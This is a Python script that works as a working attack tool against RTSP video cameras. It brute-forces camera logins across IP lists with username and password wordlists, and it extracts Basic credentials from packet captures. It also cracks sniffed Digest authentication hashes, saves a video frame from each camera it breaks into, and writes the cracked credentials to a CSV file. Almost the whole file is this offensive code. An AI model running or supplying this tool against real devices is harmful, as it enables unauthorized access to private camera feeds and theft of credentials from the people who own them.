#! /usr/bin/env python3

import cv2
from pickle import dump
from scapy.all import *
from hashlib import md5
from pathlib import Path
from datetime import date
from base64 import b64decode
from urllib.parse import quote
from multiprocessing import Lock, Pool, cpu_count
from optparse import OptionParser
from colorama import Fore, Back, Style
from time import strftime, localtime, time

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

def display(status, data, start='', end='\n'):
    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)

def get_arguments(*args):
    parser = OptionParser()
    for arg in args:
        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
    return parser.parse_args()[0]

lock = Lock()
threads_number = cpu_count()

verbose = True
capture_frame = False

def calculateDigestResponse(username, password, realm, method, uri, nonce):
    hash_1 = md5(f"{username}:{realm}:{password}".encode()).hexdigest()
    hash_2 = md5(f"{method}:{uri}".encode()).hexdigest()
    return md5(f"{hash_1}:{nonce}:{hash_2}".encode()).hexdigest()
def calculateDigestResponse_Handler(details):
    cracked_authorizations = []
    for ip, username, realm, method, uri, nonce, response in details:
        for password in arguments.password:
            calculated_response = calculateDigestResponse(username, password, realm, method, uri, nonce)
            if calculated_response == response:
                cracked_authorizations.append({"ip": ip, "user": username, "password": password})
                with lock:
                    display('+', f"{Back.BLUE}{username}{Back.RESET}:{Back.CYAN}{password}{Back.RESET}@{Back.MAGENTA}{ip}{Back.RESET} => Cracked")
                break
    return cracked_authorizations
def loginRTSP(ip, user, password):
    user = quote(user)
    password = quote(password)
    try:
        if user == '':
            video_capture = cv2.VideoCapture(f"rtsp://{ip}")
        else:
            video_capture = cv2.VideoCapture(f"rtsp://{user}:{password}@{ip}")
        if video_capture.isOpened():
            if capture_frame:
                ret, frame = video_capture.read()
                if ret:
                    cv2.imwrite(f"frames/{ip}.jpg", frame)
            return True
        else:
            return False
    except:
        return False
def loginHandler(details, verbose=False):
    group_successful_logins = []
    for detail in details:
        login_status = loginRTSP(detail["ip"], detail["user"], detail["password"])
        if login_status:
            with lock:
                group_successful_logins.append(detail)
                if verbose:
                    display('+', f"{Back.BLUE}{detail['user']}{Back.RESET}:{Back.CYAN}{detail['password']}{Back.RESET}@{Back.MAGENTA}{detail['ip']}{Back.RESET} => Access Granted")
                else:
                    print(f"{Back.RESET}", end='')
    return group_successful_logins

if __name__ == "__main__":
    arguments = get_arguments(('-i', "--ip", "ip", "File Name of List of IP Addresses (Seperated by ',', either File Name or IP itself)"),
                              ('-C', "--capture-file", "capture_file", "Packet Capture Files (Seperated by ',')"),
                              ('-D', "--capture-file-data", "capture_file_data", "Dump Data Extracted from Capture File in Pickle Format (Optional)"),
                              ('-u', "--user", "user", "Username for Brute Force (Seperated by ',', either File Name or User itself)"),
                              ('-p', "--password", "password", "Password For Brute Force (Seperated by ',', either File Name or Password itself)"),
                              ('-v', "--verbose", "verbose", f"Dislay Additional Information (True/False, Default={verbose})"),
                              ('-c', "--capture", "capture", f"Capture Frame if Successful Login (True/False, Default={capture_frame})"),
                              ('-w', "--write", "write", "Name of the CSV File for the Successfully Logged In IPs to be dumped (default=current data and time)"))
    if not arguments.write:
        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
    if not arguments.password:
        display('*', f"No {Back.MAGENTA}PASSWORD{Back.RESET} Specified")
        display(':', f"Setting Password to {Back.MAGENTA}Blank{Back.RESET}")
        arguments.password = ['']
    else:
        try:
            with open(arguments.password, 'rb') as file:
                display(':', f"Loading Passwords from File {Back.MAGENTA}{arguments.password}{Back.RESET}")
                arguments.password = [password for password in file.read().decode(errors="ignore").split('\n')]
                display('+', f"Passwords Loaded = {Back.MAGENTA}{len(arguments.password)}{Back.RESET}")
        except FileNotFoundError:
            arguments.password = [password for password in arguments.password.split(',')]
        except OSError:
            arguments.password = [password for password in arguments.password.split(',')]
        except:
            display('-', f"Error Loading Passwords from File {Back.YELLOW}{arguments.password}{Back.RESET}")
            exit(0)
    if not arguments.ip and not arguments.capture_file:
        display('-', "Please Provide a List of IP Addresses")
        exit(0)
    elif arguments.capture_file:
        rtsp_devices = {}
        rtsp_authentications = {}
        for packet_capture_file in arguments.capture_file.split(','):
            try:
                packets = rdpcap(packet_capture_file)
                for network_packet in packets:
                    try:
                        if Raw in network_packet and "RTSP" in network_packet[Raw].load.decode():
                            device_id = tuple(sorted([network_packet[IP].src, network_packet[IP].dst, str(network_packet[TCP].sport), str(network_packet[TCP].dport)]))
                            if "200 OK" in network_packet[Raw].load.decode() and device_id in rtsp_authentications:
                                rtsp_devices[device_id] = rtsp_authentications[device_id]
                            if "Authorization" in network_packet[Raw].load.decode():
                                raw_data = network_packet[Raw].load.decode().split('\n')
                                method = raw_data[0].split(' ')[0]
                                for line in raw_data:
                                    if "Authorization" in line and "digest" in line.lower():
                                        line = line[len("Authorization: Digest "):]
                                        rtsp_authentications[device_id] = {parameter.split('=')[0]: ' '.join(parameter.split('=')[1:]).replace('"', '') for parameter in line.split(', ')}
                                        rtsp_authentications[device_id]["method"] = method
                                        rtsp_authentications[device_id]["authorization"] = "DIGEST"
                                        rtsp_authentications[device_id]["device"] = network_packet[IP].dst
                                        rtsp_authentications[device_id]["source"] = network_packet[IP].src
                                        rtsp_authentications[device_id]["device_port"] = network_packet[TCP].dport
                                        rtsp_authentications[device_id]["source_port"] = network_packet[TCP].sport
                                        break
                                    elif "Authorization" in line:
                                        authorization = "BASIC"
                                        base64 = b64decode(line[len("Authorization: Basic "):].encode()).decode()
                                        username, password = base64.split(':')[0], ':'.join(base64.split(':')[1:])
                                        rtsp_authentications[device_id] = {
                                            "username": username,
                                            "password": password,
                                            "method": method,
                                            "authorization": authorization,
                                            "device": network_packet[IP].dst,
                                            "source": network_packet[IP].src,
                                            "device_port": network_packet[TCP].dport,
                                            "source_port": network_packet[TCP].sport
                                        }
                                        break
                    except:
                        pass
            except Exception as error:
                display('-', f"Error Occured while reading Packet Capture File {Back.MAGENTA}{packet_capture_file}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
        del rtsp_authentications
        rtsp_devices = list(rtsp_devices.values())
        successful_logins = []
        for rtsp_device in rtsp_devices:
            print(Fore.CYAN + '-'*100 + Fore.RESET)
            display('*', f"RTSP Device => {Back.MAGENTA}{rtsp_device['device']}{Back.RESET}")
            display('*', f"RTSP Client => {Back.MAGENTA}{rtsp_device['source']}{Back.RESET}")
            display('*', f"RTSP Device Port => {Back.MAGENTA}{rtsp_device['device_port']}{Back.RESET}")
            display('*', f"RTSP Client Port => {Back.MAGENTA}{rtsp_device['source_port']}{Back.RESET}")
            display('+', f"Method => {Back.MAGENTA}{rtsp_device['method']}{Back.RESET}")
            display('+', f"Authorization => {Back.MAGENTA}{rtsp_device['authorization']}{Back.RESET}")
            if rtsp_device['authorization'] == "DIGEST":
                display(':', f"\t* Username = {Back.MAGENTA}{rtsp_device['username']}{Back.RESET}")
                display(':', f"\t* Realm = {Back.MAGENTA}{rtsp_device['realm']}{Back.RESET}")
                display(':', f"\t* Nonce = {Back.MAGENTA}{rtsp_device['nonce']}{Back.RESET}")
                display(':', f"\t* URI = {Back.MAGENTA}{rtsp_device['uri']}{Back.RESET}")
                display(':', f"\t* Response = {Back.MAGENTA}{rtsp_device['response']}{Back.RESET}")
            else:
                display(':', f"\t* Username = {Back.MAGENTA}{rtsp_device['username']}{Back.RESET}")
                display(':', f"\t* Password = {Back.MAGENTA}{rtsp_device['password']}{Back.RESET}")
                successful_logins.append({"ip": rtsp_device["device"], "user": rtsp_device["username"], "password": rtsp_device["password"]})
            print(Fore.CYAN + '-'*100 + Fore.RESET)
        if arguments.capture_file_data:
            with open(arguments.capture_file_data, 'wb') as file:
                dump(rtsp_devices, file)
        pool = Pool(threads_number)
        threads = []
        rtsp_devices = [[rtsp_device["device"], rtsp_device["username"], rtsp_device["realm"], rtsp_device["method"], rtsp_device["uri"], rtsp_device["nonce"], rtsp_device["response"].strip()] for rtsp_device in rtsp_devices if rtsp_device["authorization"] == "DIGEST"]
        total_rtsp_devices = len(rtsp_devices)
        rtsp_devices_divisions = [rtsp_devices[index*total_rtsp_devices//threads_number: (index+1)*total_rtsp_devices//threads_number] for index in range(threads_number)]
        for index, rtsp_devices_division in enumerate(rtsp_devices_divisions):
            threads.append(pool.apply_async(calculateDigestResponse_Handler, (rtsp_devices_division, )))
        for thread in threads:
            successful_logins.extend(thread.get())
        pool.close()
        pool.join()
    else:
        ips = []
        for ip_detail in arguments.ip.split(','):
            try:
                with open(ip_detail, 'r') as file:
                    display(':', f"Loading IPs from File {Back.MAGENTA}{ip_detail}{Back.RESET}")
                    current_ips = file.read().split('\n')
                    ips.extend(current_ips)
                    display('+', f"IPs Loaded = {Back.MAGENTA}{len(current_ips)}{Back.RESET}")
            except FileNotFoundError:
                ips.append(ip_detail)
            except:
                display('-', f"Error Loading IPs from File {Back.YELLOW}{arguments.ip}{Back.RESET}")
                exit(0)
        if not arguments.user:
            display('*', f"No {Back.MAGENTA}USER{Back.RESET} Specified")
            display(':', f"Trying to Find {Back.MAGENTA}Unauthorized Access{Back.RESET}")
            arguments.user = ['']
        else:
            try:
                with open(arguments.user, 'r') as file:
                    display(':', f"Loading Users from File {Back.MAGENTA}{arguments.user}{Back.RESET}")
                    arguments.user = [user for user in file.read().split('\n')]
                    display('+', f"Users Loaded = {Back.MAGENTA}{len(arguments.user)}{Back.RESET}")
            except FileNotFoundError:
                arguments.user = [user for user in arguments.user.split(',')]
            except OSError:
                arguments.user = [user for user in arguments.user.split(',')]
            except:
                display('-', f"Error Loading Users from File {Back.YELLOW}{arguments.user}{Back.RESET}")
                exit(0)
        arguments.threads = threads_number
        pool = Pool(arguments.threads)
        if arguments.verbose == "False":
            arguments.verbose = False
        else:
            arguments.verbose = True
        if arguments.capture == "True":
            cwd = Path.cwd()
            frames_folder = cwd / "frames"
            frames_folder.mkdir(exist_ok=True)
            capture_frame = True
        details = []
        for user in arguments.user:
            for password in arguments.password:
                details.extend([{"ip": ip, "user": user, "password": password} for ip in ips])
        total_ips = len(ips)
        total_details = len(details)
        display(':', f"Total Number of IP Addresses = {Back.MAGENTA}{total_ips}{Back.RESET}")
        display(':', f"Creating {Back.MAGENTA}{arguments.threads}{Back.RESET} Threads", start='\n')
        detail_division = [details[group*total_details//arguments.threads:(group+1)*total_details//arguments.threads] for group in range(arguments.threads)]
        display('+', f"Created {Back.MAGENTA}{arguments.threads}{Back.RESET} Threads")
        display(':', f"Starting {Back.MAGENTA}{arguments.threads}{Back.RESET} Threads", start='\n')
        t1 = time()
        threads = []
        for thread_index, detail_group in enumerate(detail_division):
            threads.append(pool.apply_async(loginHandler, (detail_group, arguments.verbose)))
        successful_logins = []
        for thread in threads:
            successful_logins.extend(thread.get())
        display(':', f"Started All {Back.MAGENTA}{arguments.threads}{Back.RESET} Threads")
        pool.close()
        pool.join()
        t2 = time()
        display('+', f"All {Back.MAGENTA}{arguments.threads}{Back.RESET} Threads Completed Execution")
        display(':', f"\tTotal IP Addresses       = {Back.MAGENTA}{total_ips}{Back.RESET}")
        display(':', f"\tSuccessful Authorization = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
        display(':', f"\tTime Taken               = {Back.MAGENTA}{t2-t1:.2f} seconds{Back.RESET}")
        display(':', f"\tRate                     = {Back.MAGENTA}{total_ips/(t2-t1):.2f} IPs/second{Back.RESET}")
    display(':', f"Dumping Successfully Authorized IP Addresses in file {Back.MAGENTA}{arguments.write}{Back.RESET}", start='\n')
    with open(arguments.write, 'w') as file:
        file.write("User,Password,IP\n")
        file.write('\n'.join([f"{login['user']},{login['password']},{login['ip']}" for login in successful_logins]))
    display('+', f"Dumped Successfully Authorized IP Addresses in file {Back.MAGENTA}{arguments.write}{Back.RESET}")